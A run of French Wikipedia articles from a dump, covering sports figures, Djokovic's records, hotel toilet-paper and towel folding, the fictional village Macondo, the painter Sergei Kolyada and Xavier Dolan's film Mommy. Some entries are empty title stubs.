Depuis sa défaite en quart de finale de l’Open de Doha 2015 contre Ivo Karlović, Novak Djokovic a enchaîné 17 finales de rang. Son abandon à cause d'un problème à l’œil droit en 1/4 de finale du tournoi de Dubaï 2016 l'a stoppé à une marche du record de 18 finales consécutives réalisé par Ivan Lendl en 1981-1982.
12 finales consécutives remportées en Masters 1000, 2012-2015
Novak Djokovic a remporté 12 finales de Masters 1000 de rang auxquelles il a pris part. L'ancien record était partagé entre Rafael Nadal (Monte Carlo 2005 - Rome 2007) et Roger Federer (Indian Wells 2004 - Miami 2006) qui avaient enchaîné 9 victoires consécutives en finale de Masters 1000.
11 finales consécutives en Masters 1000, 2014-2016
Novak Djokovic a enchaîné 11 finales de rang en Masters 1000. Sa série a débuté lors du Masters de Paris-Bercy en 2014, et a pris fin au Masters de Monte-Carlo en 2016 contre Jiří Veselý. À noter que durant cette période, il n'a renoncé qu'à un seul tournoi de cette catégorie, le Masters de Madrid 2015.

</doc>
<doc id="7903535" url="https://fr.wikipedia.org/wiki?curid=7903535" title="Palmarès, statistiques et records de Novak Djokovic">
Palmarès, statistiques et records de Novak Djokovic



</doc>
<doc id="7903547" url="https://fr.wikipedia.org/wiki?curid=7903547" title="COEP">
COEP



</doc>
<doc id="7903548" url="https://fr.wikipedia.org/wiki?curid=7903548" title="College of Engineering, Pune">
College of Engineering, Pune



</doc>
<doc id="7903550" url="https://fr.wikipedia.org/wiki?curid=7903550" title="Marceli Struszyński">
Marceli Struszyński

Marceli Struszyński, né le à Winnica et mort le à Varsovie, était un chimiste polonais et professeur de l'École polytechnique de Varsovie de 1938 à 1939 et de 1945 à 1959.
Ses travaux tournèrent autour de la chimie analytique ; il développa une classification originale de aions.
Pendant la Seconde Guerre mondiale, il travailla avec la résistance polonaise. Il analysa le carburant des fusées V-2 pendant l'opération Most III.
Il était le père de Wacław Struszyński. Wacław fuit en Angleterre durant la guerre, et apporta des contributions techniques exceptionnelles à la goniométrie en mer qui permit la localisation rapide des U-boots quand ils émettaient en HF vers l'Europe.

</doc>
<doc id="7903576" url="https://fr.wikipedia.org/wiki?curid=7903576" title="Roenis Elías">
Roenis Elías

Roenis Elías Leliebre (né le à Guantánamo, Cuba) est un lanceur gaucher des Nationals de Washington de la Ligue majeure de baseball.
Carrière.
Mariners de Seattle.
Roenis Elías fait défection de Cuba vers le Mexique en octobre 2010. Il est découvert par les Mariners de Seattle de la MLB alors qu'il joue au baseball à Monterrey. Mis sous contrat le , il fait immédiatement ses débuts professionnels dans les ligues mineures avec un club-école des Mariners.
Elías fait ses débuts avec Seattle au début de la saison 2014 en faisant le saut directement du niveau Double-A des ligues mineures au baseball majeur. Joueur étoile en 2013 avec les Generals de Jackson de la Ligue Southern, il gagne une place dans la rotation de lanceurs partants des Mariners grâce à un très bon camp d'entraînement 2014 et en profitant des blessures aux lanceurs Hisashi Iwakuma et Taijuan Walker. Il joue son premier match le et n'obtient pas de décision après une belle performance d'un point et deux coups sûrs accordés aux A's d'Oakland en 5 manches. Il remporte sa première victoire dans les majeures le lorsque les Mariners triomphent des Rangers du Texas. Il effectue 29 départs et lance 163 manches et deux tiers à sa saison recrue, maintenant une moyenne de points mérités de 3,85 avec 10 victoires et 12 défaites.
Au cours d'une saison partagée entre Seattle et le club-école de Tacoma, Elías effectue 20 départs et ajoute deux présences en relève pour les Mariners en 2015. En 115 manches et un tiers lancées, sa moyenne de points mérités s'élève à 4,14.
Red Sox de Boston.
Le , les Mariners échangent les lanceurs droitiers Roenis Elías et Carson Smith aux Red Sox de Boston contre le lanceur gaucher Wade Miley et le droitier Jonathan Aro.

</doc>
<doc id="7903577" url="https://fr.wikipedia.org/wiki?curid=7903577" title="Roenis Elias">
Roenis Elias



</doc>
<doc id="7903578" url="https://fr.wikipedia.org/wiki?curid=7903578" title="Brigada Khudozhnikov">
Brigada Khudozhnikov



</doc>
<doc id="7903584" url="https://fr.wikipedia.org/wiki?curid=7903584" title="Tucker Barnhart">
Tucker Barnhart

Tucker Barnhart (né le à Indianapolis, Indiana, États-Unis) est un receveur des Tigers de Détroit de la Ligue majeure de baseball.
Carrière.
Tucker Barnhart joue au baseball à l'école secondaire en Indiana et s'engage à rejoindre le club de l'Université Georgia Tech lorsqu'il est repêché au de sélection par les Reds de Cincinnati en 2009. Il renonce alors à Georgia Tech, signe avec les Reds et commence sa carrière professionnelle dans les ligues mineures. Barnhart joue son premier match dans le baseball majeur le avec Cincinnati. Il réussit son premier coup sûr dans les majeures le suivant contre le lanceur Dillon Gee, des Mets de New York.
En 2017, le receveur signe une prolongation de contrat de quatre saisons avec les Reds, après une saison avec une seule erreur et lors de laquelle Barnhart est le meilleur receveur contre les vols de bases, éliminant 44% des coureurs adverses.
Après huit saisons avec Cincinnati, Tucker Barnhart est échangé aux Tigers de Détroit en , poussé vers la sortie par le débutant Tyler Stephenson, en échange de Nick Quintana.

</doc>
<doc id="7903586" url="https://fr.wikipedia.org/wiki?curid=7903586" title="Tioumen (volley-ball féminin)">
Tioumen (volley-ball féminin)



</doc>
<doc id="7903591" url="https://fr.wikipedia.org/wiki?curid=7903591" title="Dean Anna">
Dean Anna

Dean William Anna (né le à Mokena, Illinois, États-Unis) est un joueur de champ intérieur des Cardinals de Saint-Louis de la Ligue majeure de baseball. Il évolue comme arrêt-court et joueur de deuxième but.
Carrière.
Joueur des Cardinals de l'Université d'État de Ball, dans l'Indiana, Dean Anna est repêché par les Padres de San Diego au de sélection en 2008. Il joue 6 années en ligues mineures dans l'organisation des Padres sans atteindre le niveau majeur. Le , San Diego transfère Anna aux Yankees de New York contre un lanceur droitier des ligues mineures, Ben Paullus.
Dean Anna fait ses débuts dans le baseball majeur à l'âge de 27 ans, alors qu'il joue pour les Yankees le . À son premier match, il réussit son premier coup sûr au plus haut niveau, contre le lanceur Jeremy Jeffress des Blue Jays de Toronto. Le 10 avril suivant, il frappe contre Clay Buchholz, des Red Sox de Boston, son premier circuit dans les majeures. 
Le 11 novembre 2014, il rejoint les Cardinals de Saint-Louis.

</doc>
<doc id="7903592" url="https://fr.wikipedia.org/wiki?curid=7903592" title="Johannes Lippius">
Johannes Lippius

Johannes Lippius est un théologien, philosophe et théoricien de la musique né le à Strasbourg et mort le .
Il a été le premier à décrire l'accord parfait, sous le terme « triade harmonique », dans son traité "Synopsis musicae novae" publié en 1612.

</doc>
<doc id="7903593" url="https://fr.wikipedia.org/wiki?curid=7903593" title="Pliage du papier toilette dans les hôtels">
Pliage du papier toilette dans les hôtels

Le pliage du papier toilette dans les hôtels, parfois appelé toilegami par référence à l'origami, est le fait d'effectuer un pliage de la dernière ou des dernières feuilles du rouleau de papier toilette placé dans le dérouleur des toilettes des chambres de certains hôtels. Outre l'effet esthétique, c'est un des moyens trouvés par l'établissement hôtelier de montrer que le service de nettoyage est passé dans la salle de bains. Le pliage du papier toilette impose d'avoir une orientation par le dessus du rouleau.
Diffusion.
La pratique du pliage du papier toilette est répandue dans le monde entier et quel que soit le niveau de service de l'hôtel, bien que plus l'établissement est haut de gamme, plus la propension à y rencontrer cette pratique est élevée.
Au Japon, la pratique est très répandue dans la culture et va bien au-delà du monde de l'hôtellerie. Il existe sur le marché des plieurs de papier toilette automatiques qui permettent d'économiser du temps au personnel de chambre des hôtels, et de répliquer la pratique dans les foyers du pays.
Raisons.
Le fait de plier le papier toilette est destiné à prouver aux clients que la chambre d'hôtel a bien été nettoyée. Lors d'une enquête menée par le journaliste David Feldman, tous les hôtels contactés ont répondu de manière similaire : le pliage du papier montre que le personnel effectuant le ménage est bien passé dans la salle de bains depuis le départ du dernier client. De plus, ce genre de détail impressionne le client et détourne son attention quant à la présence possible de défauts de ménage dans le reste de la chambre.
Techniques.
Le pliage le plus basique est celui en triangle en utilisant uniquement la dernière feuille du rouleau. Des pliages plus complexes, abstraits ou en forme d'animaux ou de végétaux, demandent de plus grands nombres de plis et une plus grande maîtrise de la technique.
Le pliage est généralement effectué à la main par le personnel de l'hôtel ; cependant, une machine japonaise appelée Meruboa permet d'effectuer un pliage mécanique automatique en triangle.
Aspect psychosocial du travail.
Le temps moyen nécessaire pour effectuer un pliage à la main est évalué à , ce qui représente annuellement au niveau mondial quelque dix millions d'heures de travail soit plus de équivalents temps plein. C'est pourquoi des chercheurs s'interrogent à propos de la contre-productivité de certaines tâches, parmi lesquelles le pliage du papier hygiénique, dont le personnel d'entretien des hôtels, qui accomplit déjà un travail pénible, pourrait être déchargé.

</doc>
<doc id="7903596" url="https://fr.wikipedia.org/wiki?curid=7903596" title="Toilegami">
Toilegami



</doc>
<doc id="7903598" url="https://fr.wikipedia.org/wiki?curid=7903598" title="Jean Laurent">
Jean Laurent

Jean Laurent peut désigner :

</doc>
<doc id="7903602" url="https://fr.wikipedia.org/wiki?curid=7903602" title="Feliciano">
Feliciano

Feliciano peut faire référence à :

</doc>
<doc id="7903603" url="https://fr.wikipedia.org/wiki?curid=7903603" title="VK Tioumen (volley-ball masculin)">
VK Tioumen (volley-ball masculin)

Le Voleibolny Klub Tioumen (en ) ou VK Tioumen est un club russe de volley-ball fondé en 2009 et basé à Tioumen et qui évolue au plus haut niveau national (Superliga masculine). 
Palmarès.
Néant.

</doc>
<doc id="7903607" url="https://fr.wikipedia.org/wiki?curid=7903607" title="Église de Jämijärvi">
Église de Jämijärvi

L’église de Jämijärvi () est une église luthérienne située à Jämijärvi en Finlande.
Architecture.
L'Église de style néogothique est conçue par Georg Theodor von Chiewitz et construite en 1859–1860.
Le retable est peint par Felix Frang en 1897. 
Les orgues datent de 1929.
Liens externes.
 

</doc>
<doc id="7903610" url="https://fr.wikipedia.org/wiki?curid=7903610" title="Carnival croisières">
Carnival croisières



</doc>
<doc id="7903612" url="https://fr.wikipedia.org/wiki?curid=7903612" title="David 't Kindt">
David 't Kindt

David François 't Kindt, né à Gand, comté de Flandre (Pays-Bas du Sud, dans le Saint-Empire), le et y décédé le est un architecte flamand actif à Gand, capitale du comté de Flandre.
Il figure avec son confrère Bernard de Wilde, parmi les représentants les plus marquants du rococo gantois. Son art se caractérise par une influence du baroque exubérant de l'Allemagne du Sud pondéré par le style Louis XV.
Il reçut une formation traditionnelle de maître d'œuvre au sein de la corporation des charpentiers dont il reçut la maîtrise à 27 ans.
Il créa surtout de beaux hôtels de maître où son style particulier se remarque.

</doc>
<doc id="7903614" url="https://fr.wikipedia.org/wiki?curid=7903614" title="Animal en serviette">
Animal en serviette

Un animal en serviette est un pliage réalisé en serviettes de toilette destiné à leur faire prendre la forme d'un animal. Cette pratique est répandue sur les navires de croisière.
Histoire.
L’origine exacte des animaux de serviette est inconnue, mais leur popularité est souvent attribuée à la Carnival Cruise Line. Cette compagnie de navires de croisière crée son premier animal de serviette en 1991 . L'origine des animaux en serviette provient peut-être des animaux de mouchoir ou du .
Technique.
L'animal est réalisé lors du passage du service de chambre et généralement placé sur le lit, parfois sur un fauteuil, ou encore suspendu à une tringle, afin que l'occupant de la chambre le découvre à son retour.
La création se compose d'une ou plusieurs serviettes de toilette ainsi que parfois d'accessoires pour parfaire la mise en scène. Ainsi, divers éléments peuvent être utilisés tels que des lunettes, des boutons ou des épingles de sûreté ; ces accessoires peuvent faire partie du mobilier de la chambre ou bien faire partie des affaires personnelles laissées à vue par l'occupant de la chambre. Il est également assez courant d'utiliser des bandes de caoutchouc pour aider à maintenir la forme de la serviette. Le Grand Luxxe utilise des fleurs, des pétales de fleurs ou des palmes de palmiers pour mettre en valeur certaines de leurs créations comme un paon. 
Les employés de la Carnival Cruise Line reçoivent plus de dix heures de formation en création d'animaux en serviettes.

</doc>
<doc id="7903619" url="https://fr.wikipedia.org/wiki?curid=7903619" title="Macondo">
Macondo

Macondo est un village fictif, théâtre du déroulement du roman "Cent Ans de solitude" de Gabriel García Márquez. C'est, dans ce roman, le village de la famille Buendía. Il est librement inspiré du village d'Aracataca.
Description.
Comme le comté fictif de Yoknapatawpha chez William Faulkner ou le de Thomas Hardy, Gabriel García Márquez reprend, dans plusieurs de ses œuvres, le village imaginaire de Macondo (inspiré de sa ville natale Aracataca) comme lieu d'action même si pour lui, . Cette ville fictive est devenue célèbre dans le monde de la littérature, et comme le note Ilan Stavans, , à tel point qu'il est . Dans "Des feuilles dans la bourrasque", García Márquez décrit de façon réaliste la période du « boom de la banane » à Macondo, caractérisée par une grande abondance pendant la période où les compagnies américaines sont présentes, suivie d'une période de dépression après le départ de ces dernières. L'histoire de Macondo est racontée entièrement dans "Cent Ans de solitude", roman qui se déroule entièrement à Macondo et raconte toute l'histoire de cette ville imaginaire depuis sa fondation jusqu'à sa fin tragique. Dans son autobiographie, García Márquez explique sa fascination pour Macondo, en réalité lieu-symbole de l'origine et de la vocation artistique. Il décrit un voyage qu'il a fait avec sa mère pour revenir à Aracataca dans sa jeunesse :

</doc>
<doc id="7903625" url="https://fr.wikipedia.org/wiki?curid=7903625" title="Sergei Kolyada">
Sergei Kolyada

Sergei Avksentevich Kolyada (en ) ( - ) est un artiste soviétique avant-gardiste tardif, paysagiste, portraitiste et peintre de natures mortes.
Remarquables parmi les œuvres de l’artiste, les séries intitulées « Mon Moscou » sont considérées par les critiques d’art Valentina Grigorievna Azarkovitch et Vladimir Ivanovitch Kostin comme un important témoignage des paysages historiques de Moscou déjà disparus ou en voie de disparition sous la pression du « modernisme ».
Biographie.
Sergei Avksentevich Kolyada est né à Moscou le . À l’issue de ses études secondaires, à l’âge de 18 ans, il fréquente le studio du célèbre peintre Nikolaï Krymov dont l’enseignement influencera durablement le peintre débutant.
Trois périodes principales caractérisent la carrière de Kolyada. Une première période qu’il est possible de qualifier d’avant-gardiste tardive jusqu'en 1940. Une période surtout dédiée au réalisme soviétique dans un style pictural qualifié d’impressionnisme russe ou impressionnisme tardif. À partir de la fin des années soixante jusqu’à sa disparition, Koliada consacre l’essentiel de son activité artistique à la représentation, en 120 tableaux, de sa vision de Moscou.
De 1926 à 1930, Kolyada étudie au prestigieux Institut Supérieur des Arts et Techniques (Vhutemas-Vhutein)sous la direction de Sergueï Guerassimov et David Shterenberg. Son tableau de fin d’études (thèse) s’intitule : « L’enterrement des victimes de la Révolution ». En 1930, Kolyada rejoint la société des peintres de chevalet jusqu’à sa dissolution par les autorités en 1932. Il continue cependant à créer des œuvres originales jusqu’en 1940 en dépit de l’interdiction officielle.
Le début de la carrière artistique de Kolyada coïncide avec l’établissement du « réalisme soviétique » comme la seule forme d’art autorisée. En 1945, un grand nombre des peintures de Kolyada y compris de nombreuses œuvres qualifiées d’avant-gardistes tardives créées au cours de ses années d’études aux Vhutemas-Vhutein, et dans les années suivantes sont détruites dans un incendie suspect à la maison de ses parents près de la ville de Tartsev (région de Smolensk) où il passe ses vacances tous les ans.
À partir de 1947, Kolyada travaille pour le gouvernement en tant que peintre officiel, et crée en même temps des œuvres personnelles qui incluent des paysages, des portraits et des natures mortes. Au cours de sa vie, il n’obtient pas le prestige de certains de ses collègues plus enclins à décrire avec optimisme les conséquences de la Révolution russe. Il conserve cependant son intégrité peut-être au détriment de possibilités de promotion.
Membre fondateur de l’Union des peintres de Moscou Kolyada participe dès 1947 à de nombreuses expositions de groupe. Après la Deuxième Guerre mondiale, il collabore à plusieurs missions artistiques dans la région de « Pouchinsky-gory » puis dans les kolkhozes des environs de Moscou dans les années 1950.
Admis en 1968 dans l’Union des peintres de l’URSS, Kolyada commence alors à peindre les paysages de son « Vieux Moscou », un long travail de patience qu’il continue avec persévérance jusqu’à son décès.
Au cours des dernières années de sa vie, Kolyada voyage, peint et expose en Australie et en France.
Il meurt en 1996 dans sa ville de Moscou à l’âge de 89 ans.
Expositions.
En plus d’une participation à de nombreuses expositions de groupe, en particulier à la Galerie Tretiakov en 1977 et 1980 puis en 1997 au Parlement de la fédération de Russie (Douma) pour le anniversaire de la fondation de Moscou, la longue carrière de Kolyada est marquée par trois importantes expositions personnelles à Moscou en 1980, 1985 et 1994 (Catalogues).
1947 Exposition de groupe - Artistes de la région de Moscou
1949 Exposition de groupe - Moscou
1953 Exposition de groupe - Moscou
1959 Exposition de groupe – Moscou - Peintres portraitistes
1966 Exposition collective: “À la mémoire des défenseurs de Moscou” – Œuvres dédiées au anniversaire de la défaite des troupes fascistes près de Moscou
1968 Exposition de groupe - Artistes de la région de Moscou : "Ma région »
1977 Exposition de groupe: « L’autoportrait dans l’Art russe et soviétique » Galerie Tretiakov - Moscou (Catalogue page 50)
1980 Exposition personnelle – Glinka Museum – Moscou (Catalogue, 70 tableaux).
1980 Exposition de groupe: “Moscou dans l’art russe et soviétique ”, Galerie Tretiakov - Moscou (Catalogue page 143)
1985 Exposition personnelle – Moscou - En l’honneur de son – (catalogue - 75 tableaux).
1991 Exposition personnelle - Club Russe – Brisbane, Australie.
1991 Exposition de groupe – Nouvelle galerie Trétiakov « Artistes russes dans les années 1920 et 1930 » (Catalogue, 1991, page 60)
1992 Exposition personnelle – Etretat, France
1994 Exposition personnelle "Maison centrale du peintre” - Krimsky-val – Moscou « Moscou; Paris; Etretat »; (Catalogue 120 tableaux).
1997 Exposition de groupe à la Maison blanche (Douma) pour le anniversaire de la fondation de Moscou Group exhibition at the "White House - Moscow" for the 850th anniversary of the foundation of Moscow .
1999 Exposition personnelle - St Pierre des Corps - Tours, France
2003 Exposition personnelle - St Hilaire de Riez, France
2006 Exposition de groupe – “Museum of Russian Art”, USA - Russian Realism: Art of the 20th Century
2007 (January 8 - April 21) Exposition de groupe - “Museum of Russian Art”, USA - Colors of a Russian Winter
2007 (April 30 - September 1) Exposition de groupe - "Museum of Russian Art", USA - Soviet Bread Basket
2007 (February 19 - May 5) Exposition de groupe - "Museum of Russian Art", USA - The Milkmaids and Friends
2008 Exposition de groupe - “Museum of Russian Art”, USA - Russian Impressionism: On the Edge of Soviet Art
Depuis la disparition du peintre, l’œuvre de Sergei Kolyada reçoit une reconnaissance accrue et de nombreuses marques d’intérêt. En particulier, certains de ses tableaux ont été inclus dans cinq expositions différentes au « Museum of Russian Art – Minneapolis - aux USA de 2006 à 2008.
Une douzaine d’œuvres de Kolyada ont été acquises du vivant de l’artiste par trois musées moscovites, la Galerie d’État Trétiakov, le musée historique de Moscou et le musée Lounatcharsky.
Quelques œuvres sont incluses dans des collections privées aux USA, en Russie, au Royaume-Uni, en Australie et en France.
Liens.
http://www.sergei-arksentevich-kolyada.com
http://reedline.com/Workout/Art.htm
https://www.youtube.com/watch?v=qO7fkPkkEFQ

</doc>
<doc id="7903627" url="https://fr.wikipedia.org/wiki?curid=7903627" title="Charles-Louis-Alphonse du Tillet">
Charles-Louis-Alphonse du Tillet

Charles-Louis-Alphonse, marquis du Tillet de Montramé, né le à Paris et mort le à Chartres, est un général français.
Biographie.
Fils du marquis Charles-Claude-François du Tillet de Montramé (1727-1783), maréchal de camp, et de Charlotte-Geneviève Pellard de Sebbeval de Beaulieu, et neveu de Guillaume-Louis du Tillet, Alphonse du Tillet a pour parrain Charles-Louis Testu de Balincourt, cousin germain de son père.
Il commence la carrière des armes en 1782 en qualité de sous-lieutenant.
En 1791, il émigre et rejoint l'armée de Condé et prend part à la campagne de 1792 en qualité de chef d'escadron du régiment du Dauphin cavalerie. Quand l'Armée des princes est dissoute, il cherche alors à rejoindre Aix-la-Chapelle avec ses ami d'Haussonville et d'Aramon. L'avancée de l'armée commandée par Custine les conduisent à passer au-delà de Cassel et par Düsseldorf. Il rejoint alors les rangs des uhlans britanniques, en qualité d'officier commandant la grand'garde aux côtés d'Haussonville, et y sert dans quatre campagnes différentes, en Flandre et en Allemagne.
Rentré en France, il devient, sous la Restauration, colonel lieutenant de la compagnie d'Havré des gardes du corps du roi, puis est promu maréchal de camp. Il est le chef de la cohorte de Châteaudun.
Il est conseiller général d'Eure-et-Loir de 1825 à 1833.
Marié en 1808 à Justine de Touraille, fille du chevalier Constantin de Touraille, conseiller maître en la Chambre des comptes de Normandie, maire d'Happonvilliers et conseiller général d'Eure-et-Loir sous la Restauration, et de Geneviève Goüin, et nièce d'Alexandre et Henri Jacques Goüin-Moisant, il est le père de :

</doc>
<doc id="7903631" url="https://fr.wikipedia.org/wiki?curid=7903631" title="Damián Szifrón">
Damián Szifrón

Damián Szifron (né le à Ramos Mejía, dans le Grand Buenos Aires) est un réalisateur et scénariste argentin.
Biographie.
Szifron a étudié le cinéma avec le critique de cinéma Angel Faretta. Il a fréquemment collaboré avec l'acteur Diego Peretti, qui est notamment apparu dans ses films "Punto Muerto" (1998) et "Los Simuladores" (2002). Son film "Les Nouveaux Sauvages" a été sélectionné en compétition pour la Palme d'Or au Festival de Cannes en 2014 et nommé aux Oscars pour le meilleur film en langue étrangère. Il lui vaut le Prix Platino du meilleur réalisateur en 2015.

</doc>
<doc id="7903632" url="https://fr.wikipedia.org/wiki?curid=7903632" title="Joby Valente">
Joby Valente

Joby Valente, née le à Fonds-Saint-Denis en Martinique, est une chanteuse et actrice française.
Biographie.
Joby Valente, née Marguerite Valentine Dersion, est la fille d'une épicière et d'un boucher qui est également saxophoniste. Elle devient institutrice dans les Aurès en Algérie en 1958, puis à Suresnes en 1962. Elle reprend alors la même année des études de secrétariat et de droit. En 1969, elle suit une formation à l'école de Music-Hall de l'Olympia. Elle obtient notamment un succès avec la chanson "Disk la rayé".
Associatif.
 Elle est vice-présidente du Collectif des filles et fils d'Africains déportés (COFFAD). Elle est membre des Indigènes de la République.
Politique.
En 1994, elle se présente aux élections européennes.
En 2002, lors des élections législatives, elle est la suppléante de Dieudonné dans la huitième circonscription du Val-d'Oise. Elle se présente à l'époque comme avec Dieudonné, dont le COFFAD est alors un soutien actif, et prend elle-même des positions publiques sur la question noire, affirmant notamment qu'il est que des Noirs aient été complices de la traite négrière et qu'écrire cela relève d'une ; elle considère également que l'ensemble des calamités, politiques, économiques et naturelles, dont sont victimes les Noirs, relèvent d'un .

</doc>
<doc id="7903642" url="https://fr.wikipedia.org/wiki?curid=7903642" title="Route de France féminine 2014">
Route de France féminine 2014

La Route de France féminine 2014 est la huitième édition de la Route de France féminine, course cycliste par étapes disputée en France. Elle est organisée par l'Organisation Routes et Cycles (ORC).
Présentation.
Parcours.
L'édition 2014 part de Mouilleron-en-Pareds en Vendée et passe par les villes de Châteaudun en Eure-et-Loir, Marcigny en Saône-et-Loire ainsi que Chalette sur Loing et Paucourt dans le Loiret.
Partenaires.
Le principal partenaire de cette course, est l'agence de presse française "RMC Sport", qui couvre aussi la compétition avec ses différents médias. MPV Événements de Saint-Ouen-l'Aumône, la franchise Belisol, le groupe Škoda, les Ambulances auxerroires soutiennent également l'épreuve, ainsi que la région Centre.
Événement sur la course.
Lorène Devienne est pour la cinquième année de suite, la chanteuse officielle de la Route de France féminine.

</doc>
<doc id="7903644" url="https://fr.wikipedia.org/wiki?curid=7903644" title="Mommy">
Mommy

 est un film dramatique québécois écrit, coproduit, réalisé et monté par Xavier Dolan, sorti en 2014.
Le film présente une veuve monoparentale, Diane, qui hérite de la garde de son fils, Steve, un adolescent impulsif et violent. Au cœur de leurs emportements et difficultés, ils tentent de joindre les deux bouts, notamment grâce à l'aide inattendue de l'énigmatique voisine Kyla. Tous les trois, ils retrouvent une forme d'équilibre et d'espoir.
Le film est présenté au Festival de Cannes 2014 où il remporte le Prix du Jury.
Dolan, pour sa première participation en compétition officielle (et quatrième sélection au Festival) est à 25 ans le plus jeune réalisateur de la sélection. Dans l'histoire du festival, il est le second plus jeune réalisateur à recevoir le Prix du jury, la première étant l'Iranienne Samira Makhmalbaf, récompensée à 20 ans pour "Le Tableau noir" en 2000.
Comme dans le clip ' réalisé par Dolan en 2013, le film a la particularité d'être en majorité tourné en format d'image carré 1:1. ' a été sélectionné pour représenter le Canada à l'Oscar du meilleur film en langue étrangère lors de la des Oscars qui a eu lieu en , mais a été exclu lors de la liste préliminaire. Le film connaît un succès tant au Québec qu’en France, où il a dépassé la barre d'un million de spectateurs. Il se place en troisième position pour un film québécois le plus vu dans un territoire français, derrière les deux films de Denys Arcand.
Le film figure dans la liste "Canada's Top Ten", les dix meilleurs longs-métrages canadiens de 2014, sélectionnés par un jury composé de sept réalisateurs et professionnels de l'industrie du cinéma, coordonné par TIFF.
Synopsis.
Dans un Canada du futur proche, après les élections fédérales de 2015, une nouvelle loi, la loi S-14, autorise les parents d'enfants très difficiles à confier ceux-ci à une institution d’État de type hôpital psychiatrique pour mineurs.
Dans ce contexte, Diane « Die » Després, veuve d'une cinquantaine d'années habitant en banlieue de Montréal, récupère la garde de son fils Steve, un adolescent souffrant de troubles psychiques, du fait de son expulsion pour comportement irresponsable et dangereux du centre de rééducation dans lequel il avait été placé peu de temps après la mort de son père. En effet, il a mis le feu à la cantine de l'institution, incident qui a blessé gravement l'un des résidents. Diane lutte pour s'occuper de Steve malgré sa détresse financière. Il lui offre un caddie plein de courses, ainsi qu'un collier avec l'inscription « Mommy », qu'elle suspecte avoir été volé. Enragé, Steve commence à l'étrangler. Diane se défend en le frappant avec un cadre. Du chaos qui s'ensuit surgit Kyla, la voisine de Diane, une enseignante en congé sabbatique, qui commence à guérir les blessures de Steve.
Kyla, qui souffre de bégaiement, commence à aider Steve à étudier. Après une session désastreuse, où Steve ne cesse de l'admonester, Kyla craque et plaque son élève au sol. Totalement dominé, l'adolescent, sous le choc, en mouille son pantalon. Après la confrontation, Steve devient plus doux avec elle, lui dit qu'il est content de la connaître et respecte son souhait de ne pas l'appeler « bébé ». Les trois protagonistes tissent des liens très forts. Un jour, Diane reçoit un courrier de la part de la famille du résident blessé : elle est attaquée en justice pour les blessures causées par son fils.
Diane fait appel à un de ses voisins, Paul, qui est avocat, pour les aider. Un soir, ils vont chercher un endroit pour manger et arrivent dans un bar karaoké, où Steve est de plus en plus agité par l'atmosphère ainsi que par le jeu de séduction entre Diane et l'avocat. Steve décide d'aller chanter, mais commence ensuite à se battre avec un homme du bar qui se moque de lui pendant sa performance. Steve, Diane et Paul se disputent. Paul gifle Steve et Diane gifle Paul, ce qui le fait fuir.
Diane continue de chercher comment aider son fils et reconstruire leur vie, mais alors qu'ils vont faire les courses avec Kyla, Steve disparaît et est retrouvé dans un rayon alors qu'il s'est tranché le poignet. Il survit cependant, et un peu plus tard, dans sa voiture, Diane se remémore tous les rêves de réussite et de bonheur qu'elle avait formés pour son fils. Elle l'emmène en fait dans un hôpital pour le soumettre à la loi S-14. Steve résiste furieusement, et Diane regrette sa décision lorsqu'elle voit la violence avec laquelle Steve est traité, mais légalement, elle ne peut désormais plus rien faire.
Kyla annonce à Diane qu'elle déménage à Toronto. Cette dernière l'encourage et se montre pleine d'espoir, mais après que Kyla eut quitté la maison, Diane ne peut contenir sa détresse face à tous ses problèmes qui ressurgissent. À l'hôpital, des membres du personnel ôtent la camisole de force de Steve, mais aussitôt défait de ses liens, celui-ci s'enfuit vers une grande fenêtre.
Production.
Développement.
Xavier Dolan, à vingt-quatre ans, réalise son cinquième long métrage, le quatrième à aborder directement la figure maternelle, bien qu'elle soit aussi traitée de façon indirecte dans son thriller "Tom à la ferme" (2013). Dolan écrit un film avec trois héros, « un film triangulaire dont aucun des personnages ne prend le pas sur l'autre ». Il se détache de l'aspect autobiographique présent dans ses premiers films, notamment dans sa représentation de la figure de la mère.
Avec André Turpin, son chef opérateur rencontré sur le clip de "", il décide de tourner le film en format 1:1 – un carré, rare au cinéma contemporain – qu'ils avaient utilisé sur le clip d'Indochine. Également monteur du film, Dolan est un habitué des changements de formats, puisqu'il avait déjà modifié les ratios de l'image dans "Tom à la ferme" pendant les scènes de suspense. Dolan estime que cela met en valeur les personnages, emprisonnant le regard du spectateur dans celui du personnage et débarrassant l'image des distractions pouvant apparaître sur les bords horizontaux. C'est un format emprunté à la photographie, et notamment à celle des portraits : 
Il propose à ses deux actrices fétiches, Anne Dorval et Suzanne Clément, les rôles principaux. Dorval interprétait déjà la mère dans "J'ai tué ma mère" et est aussi apparue dans "Les Amours imaginaires" et "Laurence Anyways". Clément jouait le rôle féminin dans "Laurence Anyways". Le troisième personnage principal, Steve, est interprété par Antoine Olivier Pilon, 16 ans au moment du tournage. Il avait un rôle de figurant dans "Laurence Anyways" et le rôle-titre du collégien dans le clip "".
Tournage.
Annoncé sur son compte en , Xavier Dolan commence le tournage à Montréal. La seconde moitié du tournage s'amorce à l'hiver 2013 et se termine en février 2014.
Ayant tourné dans la banlieue de Montréal où il a grandi, Dolan explique : .
Musique.
Pour "Mommy", Xavier Dolan a choisi la musique qu'il aime, dont notamment Céline Dion : 
Accueil.
Sortie.
"" est présenté en compétition officielle au festival de Cannes en . C'est la quatrième fois pour Xavier Dolan après "J'ai tué ma mère" sélectionné à la « Quinzaine des réalisateurs » en 2009, "Les Amours imaginaires" à « Un certain regard » en 2010 et "Laurence Anyways" également à « Un certain regard » en 2012. Le film est projeté en québécois sous-titré en français (et en anglais) en raison de l'utilisation d'un dialecte joual ; ces sous-titres ont été écrits par Xavier Dolan.
Le film est particulièrement bien accueilli lors de sa projection. Il est applaudi pendant la séance et ovationné pendant plus de 12 minutes en fin de projection. Il décroche le Prix du jury. Lors de la cérémonie de clôture Dolan prononce un discours de remerciements passionné et émouvant, il rend hommage à Jane Campion (la présidente du jury) et incite sa génération à réaliser ses rêves afin de changer le monde : « Tout est possible à qui rêve, ose, travaille et n'abandonne jamais ».
"Mommy" est vendu dans plus de 50 pays, dont les États-Unis et la France. En France, le film est à l'affiche de 315 salles, c'est la plus grosse sortie pour un film québécois depuis "Les Invasions barbares" en 2003 (455 écrans). Avant sa sortie le film suscite l'attention des médias, notamment celle de quotidien "Libération", qui lui consacre sa une et quatre pages entières. Il est aussi en couverture de "Télérama", des "Inrocks" et du supplément de "L'Express". Diaphana, le distributeur français indépendant organise une centaine d'avant-premières qui remportent un énorme succès (15 000 spectateurs au bas mot).
Box-office.
